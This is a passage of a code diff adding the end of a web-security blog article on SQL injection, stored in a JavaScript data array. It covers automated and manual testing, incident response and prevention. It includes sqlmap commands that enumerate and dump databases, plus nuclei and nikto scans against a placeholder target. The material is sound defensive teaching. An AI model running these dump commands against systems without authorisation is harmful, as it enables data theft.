+### Automated Security Testing
+\`\`\`bash
+# SQLMap automated testing
+python3 sqlmap.py -u "http://target.com/api/user?id=1" \
+    --batch \
+    --level=5 \
+    --risk=3 \
+    --dbs \
+    --dump
+
+# Nuclei template testing
+nuclei -t sqli-templates/ -u http://target.com/ -o results.txt
+\`\`\`
+
+### Manual Testing Checklist
+- [ ] Test all input parameters
+- [ ] Test URL parameters
+- [ ] Test POST data
+- [ ] Test cookies
+- [ ] Test HTTP headers
+- [ ] Test file uploads
+- [ ] Test error messages
+- [ ] Test time-based responses
+- [ ] Test different database engines
+
+### Continuous Security Testing
+\`\`\`bash
+#!/bin/bash
+# security-test.sh
+URL="http://target.com"
+
+echo "Starting security tests..."
+
+# SQL injection tests
+echo "Testing for SQL injection..."
+python3 sqlmap.py -u "$URL" --batch --crawl=2 --output-dir=sqlmap-results/
+
+# XSS tests
+echo "Testing for XSS..."
+nikto -h "$URL" -Format xml -output nikto-results.xml
+
+# Generate report
+echo "Generating security report..."
+python3 generate-report.py sqlmap-results/ nikto-results.xml > security-report.html
+
+echo "Security testing complete. Results in security-report.html"
+\`\`\`
+
+## Incident Response for SQL Injection
+
+When SQL injection is discovered, follow these steps:
+
+1. **Immediate Response**
+   - Patch vulnerable code immediately
+   - Investigate logs for unauthorized access
+   - Reset potentially compromised credentials
+
+2. **Forensic Analysis**
+   - Examine database logs and query history
+   - Identify compromised data
+   - Document the attack vector
+
+3. **Prevention Measures**
+   - Implement proper input validation
+   - Use parameterized queries exclusively
+   - Regular security audits
+
+**Remember**: Always test security measures in a controlled environment before production deployment.
+
+\`\`\`
+
+## Conclusion
+
+Web application security requires a multi-layered approach. Understanding SQL injection vulnerabilities, their impact, and proper protection methods is crucial for maintaining secure applications.
+
+Key takeaways:
+- **Always use parameterized queries** - never concatenate user input
+- **Implement defense in depth** - validation, sanitization, and proper database permissions  
+- **Test regularly** - automated and manual security testing
+- **Stay updated** - keep frameworks and libraries current
+- **Educate teams** - ensure all developers understand secure coding practices
+
+Remember: **Security is not a feature, it's a requirement**.
+`
+    category: 'Web Security',
+    tags: ['SQL Injection', 'Web Security', 'Database Security', 'Prevention'],
+    date: '2025-11-01',
+    readTime: '22 min read',
+    author: 'Web Security Specialist'
+  }
+];
